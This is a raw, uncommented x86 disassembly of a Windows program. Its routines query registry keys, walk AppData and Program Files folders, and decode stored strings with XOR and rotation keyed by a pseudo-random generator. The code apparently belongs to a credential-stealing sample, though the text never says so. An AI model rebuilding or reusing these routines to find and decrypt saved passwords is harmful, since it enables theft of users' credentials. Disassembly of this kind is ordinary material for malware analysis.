  4033ed:	8b d1                	mov    %ecx,%edx
  4033ef:	74 13                	je     0x403404
  4033f1:	0f b7 c0             	movzwl %ax,%eax
  4033f4:	66 3d 03 00          	cmp    $0x3,%ax
  4033f8:	74 12                	je     0x40340c
  4033fa:	42                   	inc    %edx
  4033fb:	42                   	inc    %edx
  4033fc:	0f b7 02             	movzwl (%edx),%eax
  4033ff:	66 85 c0             	test   %ax,%ax
  403402:	75 f0                	jne    0x4033f4
  403404:	66 83 3a 03          	cmpw   $0x3,(%edx)
  403408:	74 02                	je     0x40340c
  40340a:	33 d2                	xor    %edx,%edx
  40340c:	85 d2                	test   %edx,%edx
  40340e:	74 0c                	je     0x40341c
  403410:	e8 4f 8f 00 00       	call   0x40c364
  403415:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403418:	8b d9                	mov    %ecx,%ebx
  40341a:	eb 18                	jmp    0x403434
  40341c:	8d 5d c0             	lea    -0x40(%ebp),%ebx
  40341f:	8b c3                	mov    %ebx,%eax
  403421:	50                   	push   %eax
  403422:	ba dc e8 40 00       	mov    $0x40e8dc,%edx
  403427:	c7 45 fc 1c 00 00 00 	movl   $0x1c,-0x4(%ebp)
  40342e:	e8 de 20 00 00       	call   0x405511
  403433:	59                   	pop    %ecx
  403434:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403437:	e8 28 8f 00 00       	call   0x40c364
  40343c:	99                   	cltd
  40343d:	2b c2                	sub    %edx,%eax
  40343f:	8b f8                	mov    %eax,%edi
  403441:	d1 ff                	sar    $1,%edi
  403443:	81 ff ff 00 00 00    	cmp    $0xff,%edi
  403449:	7d 56                	jge    0x4034a1
  40344b:	8b 45 08             	mov    0x8(%ebp),%eax
  40344e:	8d 8d c0 fe ff ff    	lea    -0x140(%ebp),%ecx
  403454:	e8 da 8d 00 00       	call   0x40c233
  403459:	84 c0                	test   %al,%al
  40345b:	74 44                	je     0x4034a1
  40345d:	4f                   	dec    %edi
  40345e:	33 c9                	xor    %ecx,%ecx
  403460:	33 f6                	xor    %esi,%esi
  403462:	85 ff                	test   %edi,%edi
  403464:	7e 31                	jle    0x403497
  403466:	3b 75 fc             	cmp    -0x4(%ebp),%esi
  403469:	75 02                	jne    0x40346d
  40346b:	33 f6                	xor    %esi,%esi
  40346d:	8a 04 73             	mov    (%ebx,%esi,2),%al
  403470:	32 84 0d c1 fe ff ff 	xor    -0x13f(%ebp,%ecx,1),%al
  403477:	8a 94 0d c0 fe ff ff 	mov    -0x140(%ebp,%ecx,1),%dl
  40347e:	3a c2                	cmp    %dl,%al
  403480:	73 02                	jae    0x403484
  403482:	fe c8                	dec    %al
  403484:	2a c2                	sub    %dl,%al
  403486:	8b 55 08             	mov    0x8(%ebp),%edx
  403489:	66 0f b6 c0          	movzbw %al,%ax
  40348d:	66 89 04 4a          	mov    %ax,(%edx,%ecx,2)
  403491:	41                   	inc    %ecx
  403492:	46                   	inc    %esi
  403493:	3b cf                	cmp    %edi,%ecx
  403495:	7c cf                	jl     0x403466
  403497:	8b 45 08             	mov    0x8(%ebp),%eax
  40349a:	66 83 24 48 00       	andw   $0x0,(%eax,%ecx,2)
  40349f:	8b f1                	mov    %ecx,%esi
  4034a1:	5f                   	pop    %edi
  4034a2:	8b c6                	mov    %esi,%eax
  4034a4:	5e                   	pop    %esi
  4034a5:	5b                   	pop    %ebx
  4034a6:	c9                   	leave
  4034a7:	c3                   	ret
  4034a8:	55                   	push   %ebp
  4034a9:	8b ec                	mov    %esp,%ebp
  4034ab:	83 ec 50             	sub    $0x50,%esp
  4034ae:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4034b1:	50                   	push   %eax
  4034b2:	ba c8 e8 40 00       	mov    $0x40e8c8,%edx
  4034b7:	e8 55 20 00 00       	call   0x405511
  4034bc:	59                   	pop    %ecx
  4034bd:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4034c0:	50                   	push   %eax
  4034c1:	ba b4 e8 40 00       	mov    $0x40e8b4,%edx
  4034c6:	e8 46 20 00 00       	call   0x405511
  4034cb:	59                   	pop    %ecx
  4034cc:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4034cf:	50                   	push   %eax
  4034d0:	ba 9c e8 40 00       	mov    $0x40e89c,%edx
  4034d5:	e8 37 20 00 00       	call   0x405511
  4034da:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4034dd:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4034e0:	59                   	pop    %ecx
  4034e1:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4034e4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4034e7:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4034ea:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4034ed:	33 c0                	xor    %eax,%eax
  4034ef:	50                   	push   %eax
  4034f0:	50                   	push   %eax
  4034f1:	50                   	push   %eax
  4034f2:	ff 75 0c             	push   0xc(%ebp)
  4034f5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4034f8:	68 0f 35 40 00       	push   $0x40350f
  4034fd:	6a 05                	push   $0x5
  4034ff:	6a 03                	push   $0x3
  403501:	50                   	push   %eax
  403502:	ff 75 08             	push   0x8(%ebp)
  403505:	e8 3e 4d 00 00       	call   0x408248
  40350a:	83 c4 24             	add    $0x24,%esp
  40350d:	c9                   	leave
  40350e:	c3                   	ret
  40350f:	55                   	push   %ebp
  403510:	8b ec                	mov    %esp,%ebp
  403512:	83 e4 f8             	and    $0xfffffff8,%esp
  403515:	81 ec 74 02 00 00    	sub    $0x274,%esp
  40351b:	53                   	push   %ebx
  40351c:	56                   	push   %esi
  40351d:	8b 75 0c             	mov    0xc(%ebp),%esi
  403520:	57                   	push   %edi
  403521:	ff 75 08             	push   0x8(%ebp)
  403524:	8d 4c 24 7c          	lea    0x7c(%esp),%ecx
  403528:	8d 46 2c             	lea    0x2c(%esi),%eax
  40352b:	51                   	push   %ecx
  40352c:	e8 eb 4c 00 00       	call   0x40821c
  403531:	84 c0                	test   %al,%al
  403533:	59                   	pop    %ecx
  403534:	59                   	pop    %ecx
  403535:	0f 84 fc 01 00 00    	je     0x403737
  40353b:	f6 06 10             	testb  $0x10,(%esi)
  40353e:	74 13                	je     0x403553
  403540:	ff 75 10             	push   0x10(%ebp)
  403543:	8d 44 24 7c          	lea    0x7c(%esp),%eax
  403547:	50                   	push   %eax
  403548:	e8 5b ff ff ff       	call   0x4034a8
  40354d:	59                   	pop    %ecx
  40354e:	e9 e3 01 00 00       	jmp    0x403736
  403553:	8b 3d 94 e0 40 00    	mov    0x40e094,%edi
  403559:	68 02 00 02 00       	push   $0x20002
  40355e:	6a 08                	push   $0x8
  403560:	ff 35 a0 3e 42 00    	push   0x423ea0
  403566:	ff d7                	call   *%edi
  403568:	33 db                	xor    %ebx,%ebx
  40356a:	3b c3                	cmp    %ebx,%eax
  40356c:	89 44 24 14          	mov    %eax,0x14(%esp)
  403570:	0f 84 c1 01 00 00    	je     0x403737
  403576:	8b 35 80 e0 40 00    	mov    0x40e080,%esi
  40357c:	8d 4c 24 78          	lea    0x78(%esp),%ecx
  403580:	51                   	push   %ecx
  403581:	68 ff ff 00 00       	push   $0xffff
  403586:	50                   	push   %eax
  403587:	53                   	push   %ebx
  403588:	53                   	push   %ebx
  403589:	53                   	push   %ebx
  40358a:	ff d6                	call   *%esi
  40358c:	3b c3                	cmp    %ebx,%eax
  40358e:	0f 86 99 01 00 00    	jbe    0x40372d
  403594:	8d 48 01             	lea    0x1(%eax),%ecx
  403597:	8b 44 24 14          	mov    0x14(%esp),%eax
  40359b:	e8 d5 8e 00 00       	call   0x40c475
  4035a0:	84 c0                	test   %al,%al
  4035a2:	0f 84 85 01 00 00    	je     0x40372d
  4035a8:	68 20 0c 00 00       	push   $0xc20
  4035ad:	6a 08                	push   $0x8
  4035af:	ff 35 a0 3e 42 00    	push   0x423ea0
  4035b5:	ff d7                	call   *%edi
  4035b7:	8b f8                	mov    %eax,%edi
  4035b9:	3b fb                	cmp    %ebx,%edi
  4035bb:	89 7c 24 18          	mov    %edi,0x18(%esp)
  4035bf:	0f 84 68 01 00 00    	je     0x40372d
  4035c5:	8d 87 fc 03 00 00    	lea    0x3fc(%edi),%eax
  4035cb:	05 fe 01 00 00       	add    $0x1fe,%eax
  4035d0:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4035d4:	8b 44 24 14          	mov    0x14(%esp),%eax
  4035d8:	89 44 24 10          	mov    %eax,0x10(%esp)
  4035dc:	8d 44 24 24          	lea    0x24(%esp),%eax
  4035e0:	50                   	push   %eax
  4035e1:	ba 94 e8 40 00       	mov    $0x40e894,%edx
  4035e6:	e8 26 1f 00 00       	call   0x405511
  4035eb:	59                   	pop    %ecx
  4035ec:	8d 44 24 38          	lea    0x38(%esp),%eax
  4035f0:	50                   	push   %eax
  4035f1:	ba 88 e8 40 00       	mov    $0x40e888,%edx
  4035f6:	e8 16 1f 00 00       	call   0x405511
  4035fb:	59                   	pop    %ecx
  4035fc:	8d 44 24 44          	lea    0x44(%esp),%eax
  403600:	50                   	push   %eax
  403601:	ba 7c e8 40 00       	mov    $0x40e87c,%edx
  403606:	e8 06 1f 00 00       	call   0x405511
  40360b:	59                   	pop    %ecx
  40360c:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403610:	50                   	push   %eax
  403611:	ba 70 e8 40 00       	mov    $0x40e870,%edx
  403616:	e8 f6 1e 00 00       	call   0x405511
  40361b:	59                   	pop    %ecx
  40361c:	bb ff 00 00 00       	mov    $0xff,%ebx
  403621:	eb 04                	jmp    0x403627
  403623:	8b 7c 24 18          	mov    0x18(%esp),%edi
  403627:	8d 44 24 78          	lea    0x78(%esp),%eax
  40362b:	50                   	push   %eax
  40362c:	53                   	push   %ebx
  40362d:	57                   	push   %edi
  40362e:	6a 00                	push   $0x0
  403630:	8d 44 24 34          	lea    0x34(%esp),%eax
  403634:	50                   	push   %eax
  403635:	ff 74 24 24          	push   0x24(%esp)
  403639:	ff d6                	call   *%esi
  40363b:	85 c0                	test   %eax,%eax
  40363d:	0f 86 c8 00 00 00    	jbe    0x40370b
  403643:	8d 44 24 78          	lea    0x78(%esp),%eax
  403647:	50                   	push   %eax
  403648:	6a 15                	push   $0x15
  40364a:	8d 44 24 40          	lea    0x40(%esp),%eax
  40364e:	50                   	push   %eax
  40364f:	ff 74 24 1c          	push   0x1c(%esp)
  403653:	ff 15 78 e0 40 00    	call   *0x40e078
  403659:	89 44 24 20          	mov    %eax,0x20(%esp)
  40365d:	48                   	dec    %eax
  40365e:	3d fe ff 00 00       	cmp    $0xfffe,%eax
  403663:	0f 87 a2 00 00 00    	ja     0x40370b
  403669:	8d 44 24 78          	lea    0x78(%esp),%eax
  40366d:	50                   	push   %eax
  40366e:	53                   	push   %ebx
  40366f:	81 c7 fe 01 00 00    	add    $0x1fe,%edi
  403675:	57                   	push   %edi
  403676:	6a 00                	push   $0x0
  403678:	8d 44 24 54          	lea    0x54(%esp),%eax
  40367c:	50                   	push   %eax
  40367d:	ff 74 24 24          	push   0x24(%esp)
  403681:	ff d6                	call   *%esi
  403683:	85 c0                	test   %eax,%eax
  403685:	0f 86 80 00 00 00    	jbe    0x40370b
  40368b:	8d 44 24 78          	lea    0x78(%esp),%eax
  40368f:	50                   	push   %eax
  403690:	53                   	push   %ebx
  403691:	8d 87 fe 01 00 00    	lea    0x1fe(%edi),%eax
  403697:	50                   	push   %eax
  403698:	6a 00                	push   $0x0
  40369a:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  40369e:	50                   	push   %eax
  40369f:	ff 74 24 24          	push   0x24(%esp)
  4036a3:	ff d6                	call   *%esi
  4036a5:	85 c0                	test   %eax,%eax
  4036a7:	76 62                	jbe    0x40370b
  4036a9:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4036ad:	8d 87 fe 01 00 00    	lea    0x1fe(%edi),%eax
  4036b3:	50                   	push   %eax
  4036b4:	e8 20 fd ff ff       	call   0x4033d9
  4036b9:	85 c0                	test   %eax,%eax
  4036bb:	59                   	pop    %ecx
  4036bc:	7e 4d                	jle    0x40370b
  4036be:	8d 44 24 50          	lea    0x50(%esp),%eax
  4036c2:	50                   	push   %eax
  4036c3:	ba 60 e9 40 00       	mov    $0x40e960,%edx
  4036c8:	e8 44 1e 00 00       	call   0x405511
  4036cd:	59                   	pop    %ecx
  4036ce:	ff 74 24 20          	push   0x20(%esp)
  4036d2:	8d 87 fe 01 00 00    	lea    0x1fe(%edi),%eax
  4036d8:	ff 74 24 1c          	push   0x1c(%esp)
  4036dc:	ba 11 03 00 00       	mov    $0x311,%edx
  4036e1:	50                   	push   %eax
  4036e2:	57                   	push   %edi
  4036e3:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  4036e7:	8d 44 24 60          	lea    0x60(%esp),%eax
  4036eb:	50                   	push   %eax
  4036ec:	e8 08 8d 00 00       	call   0x40c3f9
  4036f1:	83 c4 14             	add    $0x14,%esp
  4036f4:	85 c0                	test   %eax,%eax
  4036f6:	7e 13                	jle    0x40370b
  4036f8:	57                   	push   %edi
  4036f9:	8b 7d 10             	mov    0x10(%ebp),%edi
  4036fc:	8b cf                	mov    %edi,%ecx
  4036fe:	e8 08 89 00 00       	call   0x40c00b
  403703:	84 c0                	test   %al,%al
  403705:	59                   	pop    %ecx
  403706:	74 03                	je     0x40370b
  403708:	ff 47 04             	incl   0x4(%edi)
  40370b:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40370f:	6a 01                	push   $0x1
  403711:	e8 7f 8d 00 00       	call   0x40c495
  403716:	85 c0                	test   %eax,%eax
  403718:	59                   	pop    %ecx
  403719:	89 44 24 10          	mov    %eax,0x10(%esp)
  40371d:	0f 85 00 ff ff ff    	jne    0x403623
  403723:	ff 74 24 18          	push   0x18(%esp)
  403727:	e8 0e 87 00 00       	call   0x40be3a
  40372c:	59                   	pop    %ecx
  40372d:	ff 74 24 14          	push   0x14(%esp)
  403731:	e8 04 87 00 00       	call   0x40be3a
  403736:	59                   	pop    %ecx
  403737:	5f                   	pop    %edi
  403738:	5e                   	pop    %esi
  403739:	b0 01                	mov    $0x1,%al
  40373b:	5b                   	pop    %ebx
  40373c:	8b e5                	mov    %ebp,%esp
  40373e:	5d                   	pop    %ebp
  40373f:	c3                   	ret
  403740:	55                   	push   %ebp
  403741:	8b ec                	mov    %esp,%ebp
  403743:	81 ec 84 04 00 00    	sub    $0x484,%esp
  403749:	53                   	push   %ebx
  40374a:	56                   	push   %esi
  40374b:	57                   	push   %edi
  40374c:	6a 08                	push   $0x8
  40374e:	33 db                	xor    %ebx,%ebx
  403750:	53                   	push   %ebx
  403751:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403754:	50                   	push   %eax
  403755:	e8 43 87 00 00       	call   0x40be9d
  40375a:	8d 45 90             	lea    -0x70(%ebp),%eax
  40375d:	50                   	push   %eax
  40375e:	ba 48 e8 40 00       	mov    $0x40e848,%edx
  403763:	e8 a9 1d 00 00       	call   0x405511
  403768:	59                   	pop    %ecx
  403769:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40376c:	50                   	push   %eax
  40376d:	ba 30 e8 40 00       	mov    $0x40e830,%edx
  403772:	e8 9a 1d 00 00       	call   0x405511
  403777:	59                   	pop    %ecx
  403778:	be 04 01 00 00       	mov    $0x104,%esi
  40377d:	56                   	push   %esi
  40377e:	8d 45 d0             	lea    -0x30(%ebp),%eax
  403781:	50                   	push   %eax
  403782:	8d 45 90             	lea    -0x70(%ebp),%eax
  403785:	50                   	push   %eax
  403786:	8d bd 88 fd ff ff    	lea    -0x278(%ebp),%edi
  40378c:	b8 02 00 00 80       	mov    $0x80000002,%eax
  403791:	e8 f9 4c 00 00       	call   0x40848f
  403796:	83 c4 0c             	add    $0xc,%esp
  403799:	83 f8 ff             	cmp    $0xffffffff,%eax
  40379c:	74 27                	je     0x4037c5
  40379e:	3b c3                	cmp    %ebx,%eax
  4037a0:	76 23                	jbe    0x4037c5
  4037a2:	56                   	push   %esi
  4037a3:	8d 85 80 fb ff ff    	lea    -0x480(%ebp),%eax
  4037a9:	50                   	push   %eax
  4037aa:	8b c7                	mov    %edi,%eax
  4037ac:	50                   	push   %eax
  4037ad:	ff 15 7c e0 40 00    	call   *0x40e07c
  4037b3:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4037b6:	50                   	push   %eax
  4037b7:	8d 85 80 fb ff ff    	lea    -0x480(%ebp),%eax
  4037bd:	50                   	push   %eax
  4037be:	e8 e5 fc ff ff       	call   0x4034a8
  4037c3:	59                   	pop    %ecx
  4037c4:	59                   	pop    %ecx
  4037c5:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  4037c8:	75 70                	jne    0x40383a
  4037ca:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4037cd:	50                   	push   %eax
  4037ce:	ba 18 e8 40 00       	mov    $0x40e818,%edx
  4037d3:	e8 39 1d 00 00       	call   0x405511
  4037d8:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4037db:	59                   	pop    %ecx
  4037dc:	c7 45 e8 23 00 00 00 	movl   $0x23,-0x18(%ebp)
  4037e3:	c7 45 ec 1a 00 00 00 	movl   $0x1a,-0x14(%ebp)
  4037ea:	c7 45 f0 26 00 00 00 	movl   $0x26,-0x10(%ebp)
  4037f1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4037f4:	33 f6                	xor    %esi,%esi
  4037f6:	8d 85 88 fd ff ff    	lea    -0x278(%ebp),%eax
  4037fc:	50                   	push   %eax
  4037fd:	53                   	push   %ebx
  4037fe:	53                   	push   %ebx
  4037ff:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  403803:	53                   	push   %ebx
  403804:	ff 15 14 e1 40 00    	call   *0x40e114
  40380a:	85 c0                	test   %eax,%eax
  40380c:	75 23                	jne    0x403831
  40380e:	53                   	push   %ebx
  40380f:	53                   	push   %ebx
  403810:	53                   	push   %ebx
  403811:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403814:	50                   	push   %eax
  403815:	68 0f 35 40 00       	push   $0x40350f
  40381a:	6a 02                	push   $0x2
  40381c:	6a 01                	push   $0x1
  40381e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403821:	50                   	push   %eax
  403822:	8d 85 88 fd ff ff    	lea    -0x278(%ebp),%eax
  403828:	50                   	push   %eax
  403829:	e8 1a 4a 00 00       	call   0x408248
  40382e:	83 c4 24             	add    $0x24,%esp
  403831:	46                   	inc    %esi
  403832:	83 fe 03             	cmp    $0x3,%esi
  403835:	72 bf                	jb     0x4037f6
  403837:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  40383a:	76 0a                	jbe    0x403846
  40383c:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40383f:	e8 5c fb ff ff       	call   0x4033a0
  403844:	eb 09                	jmp    0x40384f
  403846:	ff 75 f8             	push   -0x8(%ebp)
  403849:	e8 ec 85 00 00       	call   0x40be3a
  40384e:	59                   	pop    %ecx
  40384f:	5f                   	pop    %edi
  403850:	5e                   	pop    %esi
  403851:	5b                   	pop    %ebx
  403852:	c9                   	leave
  403853:	c3                   	ret
  403854:	8b 01                	mov    (%ecx),%eax
  403856:	69 c0 05 84 08 08    	imul   $0x8088405,%eax,%eax
  40385c:	6a 20                	push   $0x20
  40385e:	6a 00                	push   $0x0
  403860:	ff 74 24 0c          	push   0xc(%esp)
  403864:	40                   	inc    %eax
  403865:	6a 00                	push   $0x0
  403867:	50                   	push   %eax
  403868:	89 01                	mov    %eax,(%ecx)
  40386a:	e8 61 4d 00 00       	call   0x4085d0
  40386f:	52                   	push   %edx
  403870:	50                   	push   %eax
  403871:	e8 2b 4d 00 00       	call   0x4085a1
  403876:	c3                   	ret
  403877:	55                   	push   %ebp
  403878:	8b ec                	mov    %esp,%ebp
  40387a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40387d:	81 ec 08 01 00 00    	sub    $0x108,%esp
  403883:	53                   	push   %ebx
  403884:	56                   	push   %esi
  403885:	57                   	push   %edi
  403886:	e8 d9 8a 00 00       	call   0x40c364
  40388b:	99                   	cltd
  40388c:	2b c2                	sub    %edx,%eax
  40388e:	8b f0                	mov    %eax,%esi
  403890:	d1 fe                	sar    $1,%esi
  403892:	81 fe ff 00 00 00    	cmp    $0xff,%esi
  403898:	0f 8d fe 00 00 00    	jge    0x40399c
  40389e:	8b 45 08             	mov    0x8(%ebp),%eax
  4038a1:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  4038a7:	e8 87 89 00 00       	call   0x40c233
  4038ac:	84 c0                	test   %al,%al
  4038ae:	0f 84 e8 00 00 00    	je     0x40399c
  4038b4:	83 ee 04             	sub    $0x4,%esi
  4038b7:	33 db                	xor    %ebx,%ebx
  4038b9:	85 f6                	test   %esi,%esi
  4038bb:	c7 45 fc 71 f6 0c 00 	movl   $0xcf671,-0x4(%ebp)
  4038c2:	7e 20                	jle    0x4038e4
  4038c4:	6a 08                	push   $0x8
  4038c6:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4038c9:	8d bc 1d f8 fe ff ff 	lea    -0x108(%ebp,%ebx,1),%edi
  4038d0:	e8 7f ff ff ff       	call   0x403854
  4038d5:	59                   	pop    %ecx
  4038d6:	0f be c8             	movsbl %al,%ecx
  4038d9:	8a 07                	mov    (%edi),%al
  4038db:	d2 c0                	rol    %cl,%al
  4038dd:	43                   	inc    %ebx
  4038de:	3b de                	cmp    %esi,%ebx
  4038e0:	88 07                	mov    %al,(%edi)
  4038e2:	7c e0                	jl     0x4038c4
  4038e4:	c7 45 fc 39 30 00 00 	movl   $0x3039,-0x4(%ebp)
  4038eb:	c7 45 f8 00 01 00 00 	movl   $0x100,-0x8(%ebp)
  4038f2:	56                   	push   %esi
  4038f3:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4038f6:	e8 59 ff ff ff       	call   0x403854
  4038fb:	59                   	pop    %ecx
  4038fc:	56                   	push   %esi
  4038fd:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  403900:	0f be f8             	movsbl %al,%edi
  403903:	e8 4c ff ff ff       	call   0x403854
  403908:	ff 4d f8             	decl   -0x8(%ebp)
  40390b:	59                   	pop    %ecx
  40390c:	0f be c8             	movsbl %al,%ecx
  40390f:	8d 8c 0d f8 fe ff ff 	lea    -0x108(%ebp,%ecx,1),%ecx
  403916:	8a 19                	mov    (%ecx),%bl
  403918:	8d 84 3d f8 fe ff ff 	lea    -0x108(%ebp,%edi,1),%eax
  40391f:	8a 10                	mov    (%eax),%dl
  403921:	88 18                	mov    %bl,(%eax)
  403923:	88 11                	mov    %dl,(%ecx)
  403925:	75 cb                	jne    0x4038f2
  403927:	33 ff                	xor    %edi,%edi
  403929:	85 f6                	test   %esi,%esi
  40392b:	c7 45 fc 64 a5 00 00 	movl   $0xa564,-0x4(%ebp)
  403932:	7e 1a                	jle    0x40394e
  403934:	68 00 01 00 00       	push   $0x100
  403939:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40393c:	e8 13 ff ff ff       	call   0x403854
  403941:	30 84 3d f8 fe ff ff 	xor    %al,-0x108(%ebp,%edi,1)
  403948:	47                   	inc    %edi
  403949:	3b fe                	cmp    %esi,%edi
  40394b:	59                   	pop    %ecx
  40394c:	7c e6                	jl     0x403934
  40394e:	33 ff                	xor    %edi,%edi
  403950:	85 f6                	test   %esi,%esi
  403952:	c7 45 fc 31 d4 00 00 	movl   $0xd431,-0x4(%ebp)
  403959:	7e 1a                	jle    0x403975
  40395b:	68 00 01 00 00       	push   $0x100
  403960:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  403963:	e8 ec fe ff ff       	call   0x403854
  403968:	28 84 3d f8 fe ff ff 	sub    %al,-0x108(%ebp,%edi,1)
  40396f:	47                   	inc    %edi
  403970:	3b fe                	cmp    %esi,%edi
  403972:	59                   	pop    %ecx
  403973:	7c e6                	jl     0x40395b
  403975:	33 c0                	xor    %eax,%eax
  403977:	85 f6                	test   %esi,%esi
  403979:	7e 15                	jle    0x403990
  40397b:	66 0f b6 8c 05 f8 fe 	movzbw -0x108(%ebp,%eax,1),%cx
  403982:	ff ff 
  403984:	8b 55 08             	mov    0x8(%ebp),%edx
  403987:	66 89 0c 42          	mov    %cx,(%edx,%eax,2)
  40398b:	40                   	inc    %eax
  40398c:	3b c6                	cmp    %esi,%eax
  40398e:	7c eb                	jl     0x40397b
  403990:	8b 45 08             	mov    0x8(%ebp),%eax
  403993:	66 83 24 70 00       	andw   $0x0,(%eax,%esi,2)
  403998:	8b c6                	mov    %esi,%eax
  40399a:	eb 02                	jmp    0x40399e
  40399c:	33 c0                	xor    %eax,%eax
  40399e:	5f                   	pop    %edi
  40399f:	5e                   	pop    %esi
  4039a0:	5b                   	pop    %ebx
  4039a1:	c9                   	leave
  4039a2:	c3                   	ret
  4039a3:	55                   	push   %ebp
  4039a4:	8b ec                	mov    %esp,%ebp
  4039a6:	83 ec 24             	sub    $0x24,%esp
  4039a9:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4039ac:	50                   	push   %eax
  4039ad:	ba 00 e8 40 00       	mov    $0x40e800,%edx
  4039b2:	e8 5a 1b 00 00       	call   0x405511
  4039b7:	59                   	pop    %ecx
  4039b8:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4039bb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4039be:	33 c0                	xor    %eax,%eax
  4039c0:	50                   	push   %eax
  4039c1:	50                   	push   %eax
  4039c2:	33 c9                	xor    %ecx,%ecx
  4039c4:	38 45 10             	cmp    %al,0x10(%ebp)
  4039c7:	50                   	push   %eax
  4039c8:	ff 75 0c             	push   0xc(%ebp)
  4039cb:	0f 95 c1             	setne  %cl
  4039ce:	68 bf 3b 40 00       	push   $0x403bbf
  4039d3:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4039d6:	83 c9 04             	or     $0x4,%ecx
  4039d9:	51                   	push   %ecx
  4039da:	6a 01                	push   $0x1
  4039dc:	50                   	push   %eax
  4039dd:	ff 75 08             	push   0x8(%ebp)
  4039e0:	e8 63 48 00 00       	call   0x408248
  4039e5:	83 c4 24             	add    $0x24,%esp
  4039e8:	c9                   	leave
  4039e9:	c3                   	ret
  4039ea:	55                   	push   %ebp
  4039eb:	8b ec                	mov    %esp,%ebp
  4039ed:	81 ec 94 00 00 00    	sub    $0x94,%esp
  4039f3:	53                   	push   %ebx
  4039f4:	56                   	push   %esi
  4039f5:	57                   	push   %edi
  4039f6:	8b 3d 94 e0 40 00    	mov    0x40e094,%edi
  4039fc:	68 02 00 02 00       	push   $0x20002
  403a01:	6a 08                	push   $0x8
  403a03:	ff 35 a0 3e 42 00    	push   0x423ea0
  403a09:	ff d7                	call   *%edi
  403a0b:	8b d8                	mov    %eax,%ebx
  403a0d:	33 c0                	xor    %eax,%eax
  403a0f:	3b d8                	cmp    %eax,%ebx
  403a11:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  403a14:	0f 84 a0 01 00 00    	je     0x403bba
  403a1a:	ff 75 08             	push   0x8(%ebp)
  403a1d:	8b 35 80 e0 40 00    	mov    0x40e080,%esi
  403a23:	68 ff ff 00 00       	push   $0xffff
  403a28:	53                   	push   %ebx
  403a29:	50                   	push   %eax
  403a2a:	50                   	push   %eax
  403a2b:	50                   	push   %eax
  403a2c:	ff d6                	call   *%esi
  403a2e:	85 c0                	test   %eax,%eax
  403a30:	0f 86 7d 01 00 00    	jbe    0x403bb3
  403a36:	8d 48 01             	lea    0x1(%eax),%ecx
  403a39:	8b c3                	mov    %ebx,%eax
  403a3b:	e8 35 8a 00 00       	call   0x40c475
  403a40:	84 c0                	test   %al,%al
  403a42:	0f 84 6b 01 00 00    	je     0x403bb3
  403a48:	68 0c 0c 00 00       	push   $0xc0c
  403a4d:	6a 08                	push   $0x8
  403a4f:	ff 35 a0 3e 42 00    	push   0x423ea0
  403a55:	ff d7                	call   *%edi
  403a57:	8b f8                	mov    %eax,%edi
  403a59:	85 ff                	test   %edi,%edi
  403a5b:	89 7d f0             	mov    %edi,-0x10(%ebp)
  403a5e:	0f 84 4f 01 00 00    	je     0x403bb3
  403a64:	8d 87 fc 03 00 00    	lea    0x3fc(%edi),%eax
  403a6a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403a6d:	05 fe 01 00 00       	add    $0x1fe,%eax
  403a72:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403a75:	8d 45 8c             	lea    -0x74(%ebp),%eax
  403a78:	50                   	push   %eax
  403a79:	ba e8 e7 40 00       	mov    $0x40e7e8,%edx
  403a7e:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403a81:	e8 8b 1a 00 00       	call   0x405511
  403a86:	59                   	pop    %ecx
  403a87:	8d 45 cc             	lea    -0x34(%ebp),%eax
  403a8a:	50                   	push   %eax
  403a8b:	ba d8 e7 40 00       	mov    $0x40e7d8,%edx
  403a90:	e8 7c 1a 00 00       	call   0x405511
  403a95:	59                   	pop    %ecx
  403a96:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403a99:	50                   	push   %eax
  403a9a:	ba cc e7 40 00       	mov    $0x40e7cc,%edx
  403a9f:	e8 6d 1a 00 00       	call   0x405511
  403aa4:	59                   	pop    %ecx
  403aa5:	8d 45 b8             	lea    -0x48(%ebp),%eax
  403aa8:	50                   	push   %eax
  403aa9:	ba b8 e7 40 00       	mov    $0x40e7b8,%edx
  403aae:	e8 5e 1a 00 00       	call   0x405511
  403ab3:	59                   	pop    %ecx
  403ab4:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  403ab7:	50                   	push   %eax
  403ab8:	ba a4 e7 40 00       	mov    $0x40e7a4,%edx
